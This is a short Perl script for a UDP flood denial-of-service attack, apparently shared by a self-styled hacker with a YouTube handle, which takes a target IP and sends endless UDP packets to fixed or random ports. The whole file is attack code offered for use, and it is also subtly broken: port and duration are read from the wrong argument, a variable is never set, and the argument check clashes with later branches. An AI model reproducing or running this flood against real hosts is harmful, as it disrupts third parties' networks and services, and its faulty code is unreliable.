#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
my ($ip,$port,$size,$time);
if ($ARGC !=1) {
printf "^[[0;31m* ^[[0;32m#> The command is: perl ddos.pl  <IP> ";
exit(1);
}
$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");

printf "[0;32m###############################################################################\n";
printf "[0;31m#                  The ip has maximum 5 seconds of internet                   #\n";
printf "[0;32m###############################################################################\n";
printf "[0;31m# UDP flood arhive by zD4NI3L           #           YouTube.com/zD4NI3LHacked #\n";
printf "[0;32m###############################################################################\n";
printf "[0;31m# Press Ctrl+C to stop the flood                                              #\n";
printf "[0;32m###############################################################################\n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 8, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=int(rand 99500) +0;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}
